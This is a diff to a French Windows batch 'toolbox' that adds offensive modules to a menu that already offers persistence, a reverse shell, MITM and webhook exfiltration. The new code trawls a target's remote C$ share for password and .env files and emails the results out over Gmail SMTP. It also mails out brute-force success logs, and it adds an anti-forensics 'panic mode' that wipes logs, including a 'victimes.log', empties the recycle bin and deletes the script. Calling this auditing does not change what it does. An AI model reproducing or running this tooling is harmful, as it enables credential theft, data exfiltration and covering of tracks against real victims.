@@ -166,7 +166,10 @@ set "t[69]=cyber_tls_scan:Scan TLS/SSL Avance~Protocoles faibles, ciphers, certi
 set "t[70]=cyber_lfi_scan:LFI et Path Traversal~Lecture de fichiers systeme via parametres URL:HIDDEN"
 set "t[71]=cyber_open_redirect:Open Redirect Avance~40 parametres x 13 payloads de redirection:HIDDEN"
 set "t[72]=cyber_export_json:Export JSON Unifie~Consolide tous findings en JSON importable:HIDDEN"
-set "total_tools=72"
+set "t[73]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche de fichiers sensibles (.env, pass) et envoi de rapport:HIDDEN"
+set "t[74]=cyber_wifi_audit:Analyseur de Securite Wi-Fi~Analyse des SSID et detection de points d'acces suspects (Evil Twin):HIDDEN"
+set "t[75]=cyber_cleanup_local:[!] PANIC MODE : Auto-Destruction~Supprime les logs, le cache et ce script"
+set "total_tools=75"
 
 
 
@@ -200,6 +203,7 @@ if "!opts!"=="[--- MES FAVORIS ---]" (
 )
 
 set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"
+set "opts=!opts!;[!] PANIC MODE : Auto-Destruction~Supprime les logs, le cache et ce script"
 
 call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
 set "main_choice=%errorlevel%"
@@ -215,7 +219,9 @@ if !main_choice! GEQ 200 (
 )
 
 set /a v_idx=fav_idx+1
+set /a panic_idx=fav_idx+2
 if "!main_choice!"=="!v_idx!" goto system_tools
+if "!main_choice!"=="!panic_idx!" goto cyber_cleanup_local
 
 set "target=!main_target[%main_choice%]!"
 if defined target if not "!target!"=="none" goto !target!
@@ -1436,7 +1442,7 @@ REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
 cls
-set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);RETOUR"
+set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);AUDIT Wi-Fi;RETOUR"
 call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
 set "cyber_choice=%errorlevel%"
 
@@ -1446,7 +1452,8 @@ if "%cyber_choice%"=="2" goto cyber_adapter_audit
 if "%cyber_choice%"=="3" goto cyber_lan_scan
 if "%cyber_choice%"=="4" goto cyber_flux_analysis
 if "%cyber_choice%"=="5" goto cyber_dns_leak
-if "%cyber_choice%"=="6" goto menu_principal
+if "%cyber_choice%"=="6" goto cyber_wifi_audit
+if "%cyber_choice%"=="7" goto menu_principal
 goto net_cyber_menu
 
 :cyber_triage
@@ -2037,6 +2044,7 @@ if "%nxt%"=="1" goto lan_all_deep
 if "%nxt%"=="2" goto lan_all_smb
 if "%nxt%"=="3" goto cyber_smb_explorer
 goto net_cyber_menu
+
 :cyber_smb_explorer
 cls
 echo.
@@ -2058,7 +2066,7 @@ if "%target_ip%"=="" goto net_cyber_menu
 cls
 echo  Cible : %target_ip% | MODE : EXPERT
 echo  ------------------------------------------------
-set "opts=Lister C:;Explorer le Bureau;Infos Systeme;Installer Persistance;Reverse Shell B64;Dumping Documents;NETTOYER LES LOGS;MITM / Spoofing;EXFILTRATION (Discord/Telegram);Retour"
+set "opts=Lister C:;Explorer le Bureau;Infos Systeme;Installer Persistance;Reverse Shell B64;Dumping Documents;NETTOYER LES LOGS;MITM / Spoofing;EXFILTRATION (Discord/Telegram);AUDIT EXPOSITION;Retour"
 call :DynamicMenu "PENTEST EXPERT : %target_ip%" "%opts%" "NONUMS"
 set "smb_sel=%errorlevel%"
 
@@ -2124,6 +2132,7 @@ if "%smb_sel%"=="6" goto smb_dump_action
 if "%smb_sel%"=="7" goto smb_cleanup_logs
 if "%smb_sel%"=="8" goto cyber_mitm_module
 if "%smb_sel%"=="9" goto cyber_exfiltrate_webhook
+if "%smb_sel%"=="10" goto cyber_exposure_audit
 goto net_cyber_menu
 
 
@@ -2262,9 +2271,9 @@ if not exist "%BRUTE_FILE%" (
     >> "%BRUTE_FILE%" echo pi:raspberry
 )
 
-echo [!] ATTENTION : Cette analyse est agressive.
 echo [i] Succes enregistres dans : penetration_success.log
 echo.
+
 
 set "SCDP=%TEMP%\aggressive_audit.ps1"
 >  "%SCDP%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
@@ -2315,7 +2324,15 @@ set "SCDP=%TEMP%\aggressive_audit.ps1"
 
 powershell -NoProfile -ExecutionPolicy Bypass -File "%SCDP%"
 if exist "%SCDP%" del "%SCDP%"
+
 echo.
+echo [OK] Audit termine.
+if exist "%SUCCESS_LOG%" (
+    echo [i] Des succes ont ete detectes. Tentative d'envoi par mail...
+    call :SendAuditMail "%SUCCESS_LOG%" "Succes de Penetration"
+) else (
+    echo [-] Aucun acces trouve, aucun mail envoye.
+)
 pause
 goto net_cyber_menu
 
@@ -6638,4 +6655,108 @@ if defined target_file (
     powershell -Command "Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile '%target_file%' -ContentType 'application/octet-stream'"
     echo [OK] Fichier envoye.
 )
-pause & goto smb_exp_menu
+pause & goto smb_exp_menu
+
+:cyber_exposure_audit
+cls
+echo %R%  [!] MODULE D'AUDIT D'EXPOSITION DES DONNEES %N%
+echo.
+if "!user_target!"=="" set /p "user_target=Nom de l'utilisateur cible : "
+set "REPORT_FILE=%TEMP%\exposure_report.txt"
+
+echo [i] Analyse des fichiers sensibles en cours...
+(
+echo --- RAPPORT D'EXPOSITION (ALEEXLEDEV) ---
+echo Date : %date% %time%
+echo Cible : %target_ip%
+echo.
+echo [1] Recherche de fichiers 'password' ou 'config' :
+dir "\\%target_ip%\C$\Users\%user_target%\Documents\*pass*" /S /B 2>nul
+dir "\\%target_ip%\C$\Users\%user_target%\Desktop\*.env" /S /B 2>nul
+) > "%REPORT_FILE%"
+
+REM --- Envoi du rapport par Mail (Utilise tes credentials SMTP) ---
+if defined SMTP_USER (
+    echo [i] Envoi du rapport a %EMAIL_TO%...
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Audit Exposition : %target_ip%' -Body 'Rapport en piece jointe' -Attachments '%REPORT_FILE%'"
+    echo [OK] Mail envoye.
+) else (
+    echo [!] SMTP non configure. Rapport disponible dans %TEMP%.
+)
+pause & goto smb_exp_menu
+
+:cyber_wifi_audit
+cls
+echo %B%  [ Wi-Fi SECURITY ANALYZER ] %N%
+echo.
+echo [i] Analyse des ondes radio...
+netsh wlan show networks mode=bssid | findstr "SSID Authentication Signal"
+echo.
+echo %Y%[!] CONSEIL : Si vous voyez deux SSID identiques dont l'un est 'Open', %N%
+echo %Y%il s'agit probablement d'une attaque Evil Twin active.%N%
+pause & goto net_cyber_menu
+
+REM ===================================================================
+REM        FONCTION D'ENVOI DE MAIL (SMTP POWERSHELL)
+REM ===================================================================
+:SendAuditMail
+set "ATTACHMENT=%~1"
+set "SUBJECT_SUFFIX=%~2"
+
+if "%SMTP_USER%"=="" (
+    echo [!] Erreur : SMTP_USER non defini dans credentials.txt.
+    exit /b
+)
+
+echo [i] Preparation de l'email via smtp.gmail.com...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'ALEEXLEDEV - Audit !SUBJECT_SUFFIX! (%target_ip%)' -Body 'Ci-joint le rapport d audit genere par la Golden Edition v3.5.' -Attachments '!ATTACHMENT!'"
+
+if %errorlevel% equ 0 (
+    echo %G%[ OK ] Rapport envoye avec succes a %EMAIL_TO%%N%
+) else (
+    echo %R%[ ERR ] Echec de l envoi (Verifiez mot de passe application Gmail)%N%
+)
+exit /b
+
+REM ===================================================================
+REM        MODULE DE NETTOYAGE POST-AUDIT (ANTI-FORENSICS)
+REM ===================================================================
+:cyber_cleanup_local
+cls
+echo %R%  ================================================%N%
+echo %R%   CLEAN-UP : EFFACEMENT DES TRACES LOCALES %N%
+echo %R%  ================================================%N%
+echo.
+echo  [1] Supprimer uniquement les logs de succès et d'audit
+echo  [2] Nettoyage complet (Logs + Dossiers temporaires + Corbeille)
+echo  [3] AUTO-DESTRUCTION (Supprime tout + ce script .bat)
+echo  [4] Retour
+echo.
+set /p "clean_choice=Action : "
+
+if "%clean_choice%"=="1" (
+    if exist "penetration_success.log" del /f /q "penetration_success.log"
+    if exist "victimes.log" del /f /q "victimes.log"
+    echo [OK] Fichiers de logs supprimés.
+    pause & goto menu_principal
+)
+
+if "%clean_choice%"=="2" (
+    echo [i] Purge des fichiers temporaires générés...
+    del /f /q "%TEMP%\advanced_turbo_scan.ps1" 2>nul
+    del /f /q "%TEMP%\aggressive_audit.ps1" 2>nul
+    del /f /q "%TEMP%\found_ips.txt" 2>nul
+    echo [i] Vidage de la corbeille...
+    powershell -Command "Clear-RecycleBin -Confirm:$false" 2>nul
+    echo %G%[ OK ] Nettoyage système effectué.%N%
+    pause & goto menu_principal
+)
+
+if "%clean_choice%"=="3" (
+    cls
+    echo %R%  [!!!] ALERTE : AUTO-DESTRUCTION EN COURS [!!!] %N%
+    timeout /t 3 /nobreak
+    (goto) 2>nul & del "%~f0" & exit
+)
+
+goto menu_principal
